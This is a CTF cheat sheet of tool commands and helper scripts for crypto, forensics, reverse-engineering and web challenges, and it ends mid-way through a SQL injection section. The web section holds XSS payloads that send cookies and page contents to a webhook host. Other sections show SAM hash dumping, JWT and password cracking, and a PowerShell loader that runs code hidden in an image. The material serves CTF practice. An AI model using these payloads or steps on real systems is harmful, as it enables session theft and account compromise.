# EzpzCTF

# Misc

### Zbar-Tools (QR Code)

```code
# Install
sudo apt-get install zbar-tools

# Commands
zbarimg output.png
```

### Git

```
# Commands
git log -p | grep -i flag
```

### mid3v2

```bash
=> Install
sudo apt-get install python-mutagen

=> Commands
mid3v2 --album="test123" sample-3s.mp3
mid3v2 --song="test123" sample-3s.mp3
mid3v2 --artist="test" sample-3s.mp3
```

### msgconvert

```bash
=> Install
sudo apt-get install libemail-outlook-message-perl

=> Commands
msgconvert *.msg

=> Information
convert message (outlook/email) to readable
```

### Hashcat

```bash
# Commands
hashcat -m 0 hash.txt passwords.txt --potfile-disable
```

### UTF-8 Encoding Table

```bash
# References
https://www.utf8-chartable.de/
```

### Yara 

```bash
# Install
sudo apt install yara

# References
https://yara.readthedocs.io/
```

### Regex

```bash
# References
https://regex101.com/
```

### 7zipcrack

```bash
# Install
https://github.com/cyberblackhole/7zip-crack

# Commands
7zipcrack file.7z rockyou.txt
```

### xxd

```bash
# Commands
xxd files | cut -d " " -f11 | tr "\n" " " | sed 's/ //g' | sed 's/\.//g' | grep -i "flag"
```

### eog

```bash
# Install
sudo apt-get update
sudo apt-get install eog

```

# CryptoGraphy

### Online Tools

```bash
https://gchq.github.io/CyberChef/
https://scwf.dima.ninja/
```

### Cryptography Writeup

```bash
=> Writeup 
$ https://github.com/rkm0959/Cryptography_Writeups
```

### Paillier cryptosystem

```bash
# References
$ https://en.wikipedia.org/wiki/Paillier_cryptosystem
$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/grabcon-ctf-2021-notrsa.md
$ https://github.com/p4-team/ctf/tree/master/2018-10-20-hitcon/crypto_paillier
$ https://ctftime.org/writeup/27171
```

### Xortool

```bash
# Install
$ pip3 install xortool

# Commands
$ xortool -l 8 -c 00 Encrypted
$ xortool Encrypted

# References
$ https://github.com/hellman/xortool
```

### Xor

```bash
# Examples
A = B ^ C
C = B ^ A
B = C ^ A

# References
$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/cryptohack.md
```

### Vim Decryptor

```bash
# Commands
python vimdecrypt.py --dictionary rockyou.txt encrypted.txt

# References
https://github.com/nlitsme/vimdecrypt

```

### Ciphey

```bash
# Command
File Input ciphey -f encrypted.txt
Unqualified input ciphey -- "Encrypted input"
Normal way ciphey -t "Encrypted input"
```

### RSACtftool

```bash
# Download
https://github.com/Ganapati/RsaCtfTool

#If sagemath error try
sudo apt-get install sagemath

#If wolframe error try
pip3 install wolframalpha

#Commands
python3 RsaCtfTool.py --publickey PublicKey.pem --private --uncipher ciphertext
python3 RsaCtfTool.py -n 712312... -e 65537 --uncipher 125123...
python3 RsaCtfTool.py --publickey public.pem --private > private.key
python3 RsaCtfTool.py --publickey public.pub --private --uncipherfile message.dat
```

### Hash Collisions

```bash
# References
https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
```

### Rsatool

```bash
# Download
https://github.com/ius/rsatool
sudo apt install libmpc-dev
sudo apt install python3-pip
sudo python3 -m pip install gmpy2

=> Commands
$ ./rsatool.py -p 3133337 -q 254783260649... -o priv.key

=> References
$ https://wishingstarmoye.com/ctf/rsatool

```

### Extract LSB (Script $1)

```bash
# Python
from PIL import Image
import sys

image = Image.open(sys.argv[1])
pixel = image.load()
payload = bytearray()
for y in xrange(3):
    for x in range(620):
        r, g, b = pixel[x,y]
        payload.append( (b&15) * 16 | (g&15) )
print(payload)

# Powershell
sal a New-Object;
Add-Type -A System.Drawing;
$g=a System.Drawing.Bitmap('Images.png');
$o=a Byte[] 1920;(0..0) | %{
    foreach ($x in(0..1919)){
        $p=$g.GetPixel($x,$_);
        $o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))
    }
};
$g.Dispose();
IEX([System.Text.Encoding]::ASCII.GetString($o[0..330]))
```

### GPG/PGP

```bash
# Commands
gpg --import key.asc
gpg --decrypt backup.pgp
```

### Openssl

```bash
# Commands
openssl rsautl -decrypt -in flag.enc -inkey priv.key -out plaint.txt
	-> input from base64
openssl rsa -in public.pem -text -inform PEM -pubin
openssl rsa -noout -text -inform PEM -in pubkey.der -pubin
	-> Convert modulus to hex
	-> python -c "print int('<hex>',16)"

# Found
grep -v - public.pem | tr -d '\n' | base64 -d | openssl asn1parse -inform DER -i

```

### Lynx

```bash
# Install
sudo apt install lynx

# Commands
lynx --dump http://www.factordb.com/index.php?query=267655291201323217581766648921840701061 | head | tail -n 2
```

### PadBuster

```bash
# Downloads
https://github.com/AonCyberLabs/PadBuster

# Commands
perl ./padBuster.pl http://10.10.10.10/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```

### Jwt-Cracker

```bash
# Downloads
https://github.com/lmammino/jwt-cracker

# Commands
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### Jwt-Tool

```bash
# Download
https://github.com/ticarpi/jwt_tool

# Commands
python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y -d rockyou.txt

# References
https://github.com/ticarpi/jwt_tool

```

### AES Encrypt/Decrypt (Python)

```python3
from Crypto.Cipher import AES
from base64 import b64decode
from base64 import b64encode

key = b64decode(b"2OVIftcUZNGlIyb9ezz+8fNU6eScakdfrtJaiHz25Mw=")
iv = b64decode(b"ff6XdYMDM7e5K23RrcsFZQ==")
while True:
	options = input("[+] Enter (1 - Encrypt, 2 - Decrypt) : ")
	print()
	if options == "1":
		print("====Encrypting====")
		texts = input("Enter Text : ").encode()
		aes = AES.new(key, AES.MODE_CBC, iv)
		print(b64encode(aes.encrypt(texts+b"\0"*(16-len(texts)))))
	else:
		print("====Decrypting====")
		texts = input("Enter Encrypted : ").encode()
		aes = AES.new(key, AES.MODE_CBC, iv)
		decoded = b64decode(texts)
		decrypted = aes.decrypt(decoded)
		print(decrypted.decode())
	print()
```

### AES Script ($1) (Python)

```bash
from Crypto.Cipher import AES
import string

with open("cipher.bin", "rb") as f:
        result = f.readline()
iv = b"aaaaaaaaaaaaaaaa"
print(len(result))
decrypted = ""
#while "cyberx" not in decrypted :
for k in range(0,255):
        for j in range(0,255):
                key = bytearray(16)
                key[0] = k
                key[1] = j
                aes = AES.new(bytes(key), AES.MODE_CBC, iv)
                decrypted = aes.decrypt(result).decode("latin-1")
                if "cyber" in decrypted:
                        print(decrypted)
```

### Morse Code

```bash
# References
$ https://github.com/GiongfNef/Blog-CTF-2021/blob/master/CTF2021/csawctf-2021.md
```


### Numbers

```python
inputs="16 9 3 15 3 20 6 { 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 }"
print(''.join([chr(96+int(i))if not (i == "{" or i == "}") else i for i in inputs.split()]))
```

### One-Time Pad (OTP)

```python
#=====Example (1)=====
a="0346483f243d1959563d1907563d1903543d190551023d1959073d1902573d19"
b="61"*32
c="5541103a246e415e036c4c5f0e3d415a513e4a560050644859536b4f57003d4c"
k=hex(int(b,16)^int(a,16))[2:]
flags=bytearray.fromhex(hex(int(c,16)^int(k,16))[2:]).decode()
print("picoCTF{"+flags+"}")
#=====================
```

### Cipher/Encode/Hash

1. **Old Krytan Language (Guild Wars2)**

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610103129.png)

2. **Predator Language**

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610103153.png)

3. **Malbolge**

Malbolge is a public domain esoteric programming language invented by Ben Olmstead in 1998, named after the eighth circle of hell in Dante's Inferno, the Malebolge. It was specifically designed to be almost impossible to use, via a counter-intuitive 'crazy operation', base-three arithmetic, and self-altering code.

Link : [http://malbolge.doleczek.pl/](http://malbolge.doleczek.pl/)

```bash
# Examples
('&%:9]!~}|z2Vxwv-,POqponl$Hjig%eB@@>}=<M:9wv6WsU2T|nm-,jcL(I&%$#"
`CB]V?Tx<uVtT`Rpo3NlF.Jh++FdbCBA@?]!~|4XzyTT43Qsqq(Lnmkj"Fhg${z@>
```

4. **Rot**

```bash
# Example
JFJAM{j@3$@y_j!wo3y}
```

Python script to bruteforce ROT13 + ROT47

```python
# Import
import sys

# Function
def rot13(message,counter):
    Rot13=''
    alphabit = 'abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ'
    for i in message:
        if i in alphabit:
            Rot13 += alphabit[alphabit.index(i) + counter]
        else:
            Rot13 += i
    return Rot13

def rot47(data,counter):
    decode = []
    for i in range(len(data)):
        encoded = ord(data[i])
        if encoded >= 33 and encoded <= 126:
            decode.append(chr(33 + ((encoded + counter) % 94)))
        else:
            decode.append(data[i])
    return ''.join(decode)

# Input
inputs = sys.argv[1]

# ROT13 Only
print("[ROT13 Only]")
print(rot13(inputs,13))
print()

# ROT47 Only
print("[ROT47 Only]")
print(rot47(inputs,14))
print()

# ROT13 + ROT47 
print("[ROT13 + ROT47]")
for i in range(26):
    for j in range(28):
        try:
            in1 = rot13(inputs,i)
            in2 = rot47(in1,j)
            print(in2)
        except:
            pass
print()
# ROT47 + ROT13
print("[ROT47 + ROT13]")
for j in range(28):
    for i in range(26):
        try:
            in1 = rot47(inputs,j)
            in2 = rot13(in1,i)
            print(in2)
        except:
            pass
print()
```

5. **Base64**

```bash
# Example
aGVsbG8=

# List of Characters
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/=

# Custom Base64
import base64

custom_enc = "ms4otszPhcr7tMmzGMkHyFn="
ori = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789/="
custom = "ELF8n0BKxOCbj/WU9mwle4cG6hytqD+P3kZ7AzYsag2NufopRSIVQHMXJri51Tdv"
fix_enc = ""

# Fixing 
for i in range(len(custom_enc)):
	try:
		fix_enc += ori[custom.index(custom_enc[i])]
	except:
		fix_enc += custom_enc[i]
# Decode
print(base64.b64decode(fix_enc))
```

5. **Base85**

```bash
# Example
87cURD]i,"Ebo7
```

6. **MD5**

```bash
# Example
2bafea54caf6f8d718be0f234793a9be

# Bruteforce with salt (Python3)
import itertools
import hashlib
import string

pwd_hash = '2bafea54caf6f8d718be0f234793a9be'
salt = b'04532@#!!'

for key in itertools.product(string.ascii_lowercase,repeat=5):
    key = ''.join(key).encode()
    if hashlib.md5(key+salt).hexdigest() == pwd_hash:
        print('key =',key.decode())
        break
```

7. **Fernet**

Link : [https://asecuritysite.com/encryption/ferdecode](https://asecuritysite.com/encryption/ferdecode)

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610103707.png)

8. **Zodiac Killer**

Link :
- [https://www.dcode.fr/zodiac-killer-cipher](https://www.dcode.fr/zodiac-killer-cipher)
- [http://www.zodiackillerciphers.com/](http://www.zodiackillerciphers.com/)
- [https://github.com/H0j3n/Zodiac-Z340](https://github.com/H0j3n/Zodiac-Z340)

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610103852.png)

9. **Reverse Fuck**

Link : [https://www.dcode.fr/reversefuck-language](https://www.dcode.fr/reversefuck-language)

```bash
# Example
----------]<-<---<-------<---------->>>>+[<<<<,>+++,<-----------,+++++++++++,-,>>--,<---------------,<,-----------------,+++++++++++++++++,-------------,-,++++++++++++++,>++++++++++++,<----------------,++++++++++++++++++,--------,
```

10. **Brain Fuck**

Link : [https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language)

```bash
# Example
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>.<---.>+++++++++++.-----------.+.<<++.>-.>+++++++++++++.-----------------.++++++++.+++++.--------.+++++++++++++++.------------------.++++++++.
```

11. **Ascii Art Encoder**

Link : [https://pictureworthsthousandwords.appspot.com/](https://pictureworthsthousandwords.appspot.com/)

12. **IMB Barcodes**

Link : [http://bobcodes.weebly.com/imb.html](http://bobcodes.weebly.com/imb.html)

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210610104150.png)

13. **Book Cipher**

You got book.txt and got code.txt . Use this

Link : [https://www.dcode.fr/book-cipher](https://www.dcode.fr/book-cipher)

13. **Wingdingsr**

Link : [https://lingojam.com/WingdingsTranslator](https://lingojam.com/WingdingsTranslator)

```bash
♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝
```

14. **Emoji MorseCode**

Link : [https://cryptii.com/pipes/morse-code-with-emojis](https://cryptii.com/pipes/morse-code-with-emojis)
```bash
😘😘 ✋ 😘😍😘😘 😍😍😍 😘😘😘😍 😘 ✋ 😍😘😍😍 😍😍😍 😘😘😍
```

15. **Decimal**

```bash
#Examples
6710111011611497108457311010211183101991235351678251559577535795685167125
* split by actual decimal numbers manually
```

16. **Octal**

```bash
#Examples
103 145 156 164 162 141 154 055 111 156 146 157 123 145 143 173 065 063 103 122 063 067 137 115 065 071 137 060 103 067 175
* Use Cyberchef
```

17. Microsoft Script

```
# Examples
#@~^NgAAAA==\ko$K6,J0k+	^!9kUo|xG2M!4^n:1X4..E~,vl~~JP4.PWVmLPb/lE8BEAAA==^#~@.

# use Cyberchef
-> Microsoft Script Decoder
```

18. Polybius square

```bash
# Examples
21 31 11 22

# References
https://cryptii.com/pipes/polybius-square

```

19. Binary to Decimal

```
# Examples
10000000111111110100011111001110001011101000010001110101101101100010100000101010001001011001010001110100001001111110101000110

# References
https://www.binaryhexconverter.com/binary-to-decimal-converter
```

20. Hexahue Alphabet

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted image 20211013214113.png)


```bash
# References
https://www.boxentriq.com/code-breaking/hexahue
```

21. Romans Numbers

```bash
# Examples
I , IV, VI

# Script Converting
def value(r):
    if (r == 'I'):
        return 1
    if (r == 'V'):
        return 5
    if (r == 'X'):
        return 10
    if (r == 'L'):
        return 50
    if (r == 'C'):
        return 100
    if (r == 'D'):
        return 500
    if (r == 'M'):
        return 1000
    return -1
 
 
def romanToDecimal(str):
    res = 0
    i = 0
 
    while (i < len(str)):
 
        # Getting value of symbol s[i]
        s1 = value(str[i])
 
        if (i + 1 < len(str)):
 
            # Getting value of symbol s[i + 1]
            s2 = value(str[i + 1])
 
            # Comparing both values
            if (s1 >= s2):
 
                # Value of current symbol is greater
                # or equal to the next symbol
                res = res + s1
                i = i + 1
            else:
 
                # Value of current symbol is greater
                # or equal to the next symbol
                res = res + s2 - s1
                i = i + 2
        else:
            res = res + s1
            i = i + 1
 
    return res
 
 
# Driver code
print("Integer form of Roman Numeral is"),
inputs = input("Enter Numbers (Romans):" )
answers = ""
for i in inputs.split():
    answers += str(romanToDecimal(i))
    answers += " "

print(answers)
```

22. Tic Tac Toe Cipher

```bash
# Link
-> https://www.dcode.fr/tic-tac-toe-cipher
```

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted image 20211129201252.png)

23. Pigpen Cipher

```bash
# Link
-> https://www.dcode.fr/pigpen-cipher
-> https://planetcalc.com/7842/
```

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted image 20211129201518.png)

24. Ook Language

```bash
# Example
-> ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! 

-> Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook. Ook?

# Link
https://www.dcode.fr/ook-language
```

# Forensics

### Online Tools

```bash
# Pcap
https://packettotal.com/
https://www.hybrid-analysis.com/
https://iris-h.services
https://f00l.de/hacking/pcapfix.php

# Images
https://aperisolve.fr/
https://futureboy.us/stegano/decinput.html
http://stylesuxx.github.io/steganography/
https://www.mobilefish.com/services/steganography/steganography.php
https://manytools.org/hacker-tools/steganography-encode-text-into-image/
https://steganosaur.us/dissertation/tools/image
https://georgeom.net/StegOnline
https://www.pic2map.com/

# Audio
```

### StegoVeritas

```bash
# Download
https://github.com/bannsec/stegoVeritas

# Install
pip3 install stegoveritas
stegoveritas_install_deps

# Commands
stegoveritas allstar.png

```

### Libreoffice

```bash
# Install
sudo apt install libreoffice

# Commands
xdg-open files.docm
```

### List of File Signatures

```bash
# Found
50 59 5A (PYZ)
	-> .pyz,.pyc
4D 5A (MZ)
	-> .exe,.scr,.sys,.dll,.fon,.cpl,.iec,.ime,.rs,.tsp,.mz
41 72 43 01 
	-> .arc
42 4D
	-> .bmp
		-> https://medium.com/sysf/bits-to-bitmaps-a-simple-walkthrough-of-bmp-image-format-765dc6857393
89 50 4E 47 0D 0A 1A 0A
	-> png
		-> https://github.com/corkami/formats/blob/master/image/png.md
# References
https://en.wikipedia.org/wiki/List_of_file_signatures
```

1. PNG

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted image 20211209231833.png)

### Strings

```bash
# Command
strings flag.txt 
```

### StegCTF Solver

```bash
# Commands
docker run -it --rm -v $(pwd)/data:/data dominicbreuker/stego-toolkit /bin/bash
python3 stegctfsolver.py <target file>

# Notes
- Make sure put image file into data

# References
https://github.com/DominicBreuker/stego-toolkit
https://github.com/thepaulbenoit/stegctfsolver
```

### Stegseek

```bash
# Install
https://github.com/RickdeJager/stegseek/releases

# Commands

```

### Wireshark

```
# Install

# Commands
wireshark data.pcap
```

### Steghide

```bash
# Install
sudo apt install steghide

# Commands
```

### Exiftool

```bash
# Install

# Commands
exiftool image.png
exiftool -a image.jpg
exiftool -a -b -W %f_%t%-c.%s -preview:all word.png
```

### Tshark

```bash
# Install
sudo apt install tshark

# Commands
tshark -r dump.pcap
tshark -nr payload.pcapng -Y 'frame contains "flag"' -T fields -e text
tshark -nr payload.pcapng -Y 'dns' | head
tshark -nr payload.pcapng -Y 'dns && ip.src == 10.10.10.10 && frame contains "local" && ip.dst==10.10.10.11'

# Extract Websocket (payload)
tshark -r something.pcap -Y websocket.payload -E occurrence=l -T fields -e text 

# References
https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/
```

### Tcpdump

```bash
# Commands
tcpdump -r dump.pcap
```

### PCAP File

```bash
=> DNS
$ If its related to exilftration you can try check this out
	* https://blog.stalkr.net/2010/10/hacklu-ctf-challenge-9-bottle-writeup.html
	* https://github.com/yarrick/iodine
	* https://gist.github.com/SwissKid/438fbcf8a472be62ba4a412e37dc2d27

=> USB
$ USBMS -> tshark -r data.pcapng -T fields -e usb.capdata > flag
	-> cat flag | tr "\n" " " | sed 's/ //g' > realflag
	-> xxd -r -p realflag flag.bin

$ https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/

=> Websocket
-> tshark -r something.pcap -Y websocket.payload -E occurrence=l -T fields -e text 
```

### GuestMount

```bash
# Install
sudo apt install libguestfs-tools -y

# Commands
sudo mkdir /mnt/vhd
guestmount --add file.vhd --inspector --ro -v /mnt/vhd
guestunmount mnt

# If windows
cd /Windows/System32/config
cp SAM SYSTEM /<localDir>
secretsdump.py -sam SAM -system SYSTEM local
```

### Linux Memory Dump

```bash
# Command
python vol.py -f dump.mem --profile=LinuxUbuntu_142x64 linux_bash

# References
https://heisenberk.github.io/Profile-Memory-Dump/
```

### PCRT

```bash
# About
- Fix/Repair PNG image file

# Downloads
https://github.com/sherlly/PCRT.git

# Commands
python PCRT.py -i /pathto/output.png
```

### Oletools

```bash
# Download
https://github.com/decalage2/oletools.git

### olevba.py
python3 olevba.py -a malware.xls --reveal
python3 olevba.py -a malware.docm --reveal

### oledump.py
python3 ../oledump.py malware.docm -v -s A3 > output1

# References
https://spreadsecurity.github.io/2016/08/14/macro-malware-analysis.html
```

### Volatility

```bash
# Install
sudo apt-get install volatility

# Commands
python vol.py -f honeypot.raw --profile=Win7SP0x86 pslist
python vol.py -f honeypot.raw --profile=Win7SP0x86 -p 2700 memdump -D memdump
python vol.py -f persist.raw --profile=Win7SP0x86 autoruns

# References
-> https://book.hacktricks.xyz/forensics/basic-forensic-methodology/memory-dump-analysis/volatility-examples
```

### Volatility3

```bash
# Download
git clone https://github.com/volatilityfoundation/volatility3.git

# Commands
python3 vol.py -f dump.raw windows.info 
python3 vol.py -f dump.raw windows.pslist
python3 vol.py -f dump.raw windows.psscan
python3 vol.py -f dump.raw windows.pstree
python3 vol.py -f dump.raw filescan
python3 vol.py -f dump.raw windows.netstat
python3 vol.py -f dump.raw windows.cmdline
python3 vol.py -f dump.raw windows.pslist.PsList --pid 2964 --dump
python3 vol.py -f dump.raw windows.hashdump
python3 vol.py -f dump.raw windows.dumpfiles.DumpFiles --physaddr 0x3e7a4070

# References
https://blog.onfvp.com/post/volatility-cheatsheet/
https://volatility3.readthedocs.io/en/latest/index.html
```

### Testdisk

```bash
# Install
sudo apt install testdisk

# Commands
testdisk file.img
```

### Binwalk

```bash
# Commands
binwalk -D="*.*" files.jpeg
binwalk -D="*.*" files.jpeg
binwalk -e files.jpeg
binwalk --dd='.*' music.mp3
```

### Teserract

```bash
# Install
sudo apt install tesseract-ocr
sudo apt install libtesseract-dev

# Commands
tesseract 25795.png output.txt

# References
https://medium.com/quantrium-tech/installing-tesseract-4-on-ubuntu-18-04-b6fcd0cbd78f
```

### Unrar

```bash
# Install
sudo apt install unrar

# Commands
unrar e filename.rar

# References
https://linuxhint.com/extract_rar_files_ubuntu/
```

### Zsteg

```
# Install
gem install zsteg

# Commands
```

### ffmpeg (Extract thumbnail from mp3)

```bash
# Commands
ffmpeg -i allstar.mp3 allstar.png 
``` 

### Arc

```bash
# Install
sudo apt install arc

# .arc Header
41 72 43 01 

# Usage

```

### stat

```bash
# Commands
stat file.bmp | grep Size 
```

### kaitai

```bash
# Download
https://github.com/kaitai-io/kaitai_struct_formats.git
https://github.com/kaitai-io/kaitai_struct_visualizer
gem install kaitai-struct-visualizer
https://kaitai.io/

# Usage
ksv file.bmp ~/kaitai_struct_formats/image/bmp.ksy
```

### mmls

```bash
# Usage
mmls files.img

```

### fls

```bash
# Usage
fls -o 2048 files.img
fls -o 2048 files.img 18290

# Comments
-> relate with icat
```

### icat

```bash
# Usage
icat -o 2048 file.img 18291

# Comments
-> relate with fls
```

# Reverse Engineering

### CheatSheet

```bash
1. https://github.com/Kennyslaboratory/Reverse-Engineering-Cheatsheet
2. https://awesomeopensource.com/project/NotPrab/.NET-Deobfuscator
```

### Online Decompiler

```bash
1. https://dogbolt.org/ [Decompiler Explorer]
```

### Asar

```bash
# Install
npm -g install asar

# Usage
asar l app.asar   
```

### Deobfuscate Javascript

```bash
# Notes
-> cat something.js | sed -e 's/eval/console.log/g' | nodejs

# References
http://deobfuscatejavascript.com/
https://stormctf.ninja/ctf/events/infosecon-2017/competitors-section/spot-flags/spot-flag-1
```

### Hollows Hunter

```bash
# Command


# References
https://github.com/hasherezade/hollows_hunter/wiki
```

### De4dot

```bash
# Install/Download
$ https://github.com/Robert-McGinley/de4dot-Installer

# Commands
$ de4dot -d -r c:\input
$ de4dot -d file1.dll file2.dll file3.dll


# References
$ https://www.root-me.org/en/Tools/Forensic/de4dot
```

### Luyten

```bash
# References
$ https://github.com/deathmarine/Luyten
$ https://ctftime.org/writeup/21193
```

### GDB 

```bash
# Install
sudo apt-get install gdb
https://ftp.gnu.org/gnu/gdb/

# GEF
https://github.com/hugsy/gef

# Peda
https://github.com/longld/peda

# Commands (Read)
x/w $rbp-0x4
x/2b 0x00000000000072a
x/2x 0x00000000000072a
x/s $si
display $eax

# Commands(General)
run auth2 < input.txt
pattern_create 200
pattern_offset AwAA
r < <(python -c "print 'a' * 170 + 'AAAA' + + '<Argument_1>' + '<Argument_2>'")
step
next
info break
del 1
goto 0x08049eb9

# Commands (Pie)
pie b *0x116f
run


# References
http://www.gdbtutorial.com/tutorial/how-install-gdb
https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30
http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf
https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html
https://suchprogramming.com/debugging-with-gdb-part-3/
```

### Ida Pro

```bash
# How to Patch
$ https://www.youtube.com/watch?v=H8lPDdHLlvQ
```

### VBA Syntax

```bash
# Syntax
## Val
Dim MyValue
MyValue = Val("2457")    ' Returns 2457.
MyValue = Val(" 2 45 7")    ' Returns 2457.
MyValue = Val("24 and 57")    ' Returns 24.

## Mid
response.write(Mid("This is a beautiful day!",1,1))  	' T

## Chr
response.write(Chr(65) & "<br>")  ' A

## Comparison Operators
a==b  will return false.
a<>b will return true.
a<b will return true.
a>b will return false.
a<=b will return true.
a>=b will return false.

## Concatenate String
s = "Hello" & " Rhino!"       ' 'Hello Rhino!
```

### Bash Debug

```bash
# Notes
#!/bin/bash
trap "set +x; sleep 5; set -x" DEBUG

<CODE HERE>

# References
https://ctftime.org/writeup/21834
```

### BashFuscator

```bash
# Download
https://github.com/Bashfuscator/Bashfuscator

# Example
${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{}   "${@~}" $'\160'r""$'\151'$@nt"f" %s   ' }~~@{$  ")
```

### Radare2

```bash
# Download & Install 
https://github.com/radareorg/radare2.git
./configure
make
sudo make install

# Commands
r2 -w ./file
r2 ./file
r2 -AA -d binary flaghere{}
aaa
V 
v
s 0x401ffe
pd 1
wao jz
q!
dc
afl
pdf @main
pd @
db 0x72
dc
dr
px @eax
pxw @ rsp


# If encounter problem
sudo apt install build-essential cmake meson libzip-dev zlib1g-dev qt5-default libqt5svg5-dev qttools5-dev qttools5-dev qttools5-dev-tools libmagic-dev libgvc6 libgraphviz-dev libkf5syntaxhighlighting-dev python3-setuptools liblz4-dev libcapstone-dev libssl-dev libxxhash-dev libuv1-dev
sudo apt update && sudo apt upgrade

# References
https://book.rada.re/
https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html
https://r2wiki.readthedocs.io/en/latest/home/ctf-solving-using-radare2/
https://github.com/historypeats/radare2-cheatsheet
https://scoding.de/uploads/r2_cs.pdf
```

### Uncompyle6

```bash
# Install
pip install uncompyle6

# Command
uncompyle6 untitled.pyc
```

### PyInstaller Extractor

```bash
# Download
https://github.com/extremecoders-re/pyinstxtractor.git

# Command
python3 pyinstxtractor.py file.exe
python3 pyinstxtractor.py file
```

### Upx

```bash
# Install
sudo apt install upx

# Commands
upx -d file
```

### OllyDBG

```bash
# Download

# Search Strings
Right Click + Search for + All referenced text strings

# View Call Stack
Alt-K

# Go to Address
Ctrl + G

# View Breakpoints
Ctrl + B

# References
https://resources.infosecinstitute.com/topic/reverse-engineering-ollydbg/
https://github.com/cybertechniques/site/blob/master/analysis_tools/ollydbg/index.md
http://www.ollydbg.de/quickst.htm
```

### CFF Explorer

```bash
# Download
http://www.ntcore.com/files/ExplorerSuite.exe

# References
https://github.com/cybertechniques/site/blob/master/analysis_tools/cff-explorer/index.md
```

### Run Windows Program Script ($1)

```python
import os
from subprocess import CalledProcessError, Popen, PIPE
import string

flags = ""
tmp = ""
index = 0

while "flag" not in flags:
    print("Round : "+ str(index+1))
    tempflag = ""
    checkers = True
    for i in string.printable:
        if checkers:
            cmd = "PassGen.exe"
            tempflag = flags
            tempflag += i
            p = Popen(cmd, stdin=PIPE, stdout=PIPE, bufsize=0)
            stdout_data = p.communicate(input=tempflag.encode())[0]
            output = str(stdout_data)[2:-1].split(":")[2].strip().replace("\\x00","`")
            for k in range(len(output)):
                if k == index:
                    if output[index] == "`":
                        flags += i
                        print(flags)
                        print(output)
                        checkers = False
                        break
                    else:
                        checkers = True
        else:
            break
    index += 1
```

### ExtremeDumper (.NET)

```bash
# Download
https://github.com/wwh1004/ExtremeDumper
```

### Objdump

```bash
# Commands
objdump -d files

```

### Movfuscator & Demovfuscator

```bash
# Movfuscator
https://github.com/xoreaxeaxeax/movfuscator

# Demovfuscator
https://github.com/kirschju/demovfuscator

# References
https://ctftime.org/writeup/12263
```

# Web

### Practices

```bash
http://websec.fr/
```

### Convert Curl to Different Language

```bash
- Go to this website https://curl.trillworks.com/
```

### XSS

```bash
# Payload
">'><script>fetch("https://webhook.site/<ID>/?c="+document.cookie)</script>
">'><script src="https://example.com/evil.js"></script>
<img src=x onerror="location.href='https://webhook.site/<ID>/?e='+document.cookie">

#=====Script(1)======
<script>
var xml = new XMLHttpRequest();
xml.open("GET","index.php",false);
xml.send();
fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText));
//fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText).substr(0,1000));
</script>
=====================

# Notes
- https://webhook.site/ (Webhook)

# References
- https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md (Blind XSS)
```

### SQL Injection

```bash
=> (MYSQL)

1 UNION ALL SELECT 1,2,3,4 --
1 UNION ALL SELECT 1,database(),3,4 --
